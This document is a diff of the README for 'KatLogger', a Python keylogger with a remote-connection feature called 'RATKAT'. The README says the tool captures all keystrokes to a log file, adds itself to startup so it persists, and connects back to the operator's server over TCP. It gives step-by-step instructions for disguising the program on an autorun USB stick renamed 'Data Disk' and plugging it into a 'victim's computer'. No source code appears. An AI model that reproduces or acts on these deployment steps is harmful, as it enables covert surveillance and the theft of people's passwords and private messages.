@@ -4,13 +4,13 @@
 > The second release "KatLogger_1.1.zip" works only on "windows computers" :(, but we're working to make other release that work on both linux and windows.
 ## NEW FEATURES!
 > We have added some new features
-> 1) We developed a New technology called "RATKAT", with RATKAT the KeyLogger connects to our computer using TCP.
+> 1) We developed a New technology called _"RATKAT"_, with _RATKAT_ the KeyLogger connects directly to our computer using TCP sockets.
 > 2) We fixed some bugs like error handling etc...
 > *PLEASE LET US KNOW FOR ANY BUG or ISSUE IN THE CODE, telling us means also fixing the code and make a better KatLogger, thank y'all cooperation.*
 
 # How Does it Work?
-> KatLogger is made in python and it basically stores all the hit keys in the file log.txt.
-> The code is obliusly open source :), and the main file is "Kat_logger.py" in the "python/1.1" folder, there are also other files but not all of those are really used by KatLogger. These are simply new feature that we'll add in the future...
+> KatLogger is made in python and it basically stores all the hit keys in the file _log.txt_.
+> The code is obliusly open source :), and the main file is *"Kat_logger.py"* in the "python/1.1" folder, there are also other files but *not all of those are really used by KatLogger*. These are simply new feature that we'll add in the future...
 > The first time that KatLogger runs, it creates a file that executes KatLogger on the StartUp, Infact if the computer is shutdown and than turned on, KatLogger will run as normal.
 
 > # Requirements
@@ -27,8 +27,8 @@
 > - Open Usb AutoRun Creator and select the file .exe to be flashed
 > - Click Create
 > - Rename the usb stick to "Data Disk"
-> - That's all
 > - You need to run the server.py file on your computer and keep it on
+> - That's all
 > - Plug the usb in your victim's computer and enjoy =]
 ### REMEMBER: YOU NEED TO RUN THE SERVER.PY FILE ON YOUR COMPUTER AND KEEP IT RUNNING OR KATLOGGER WON'T WORK!
 
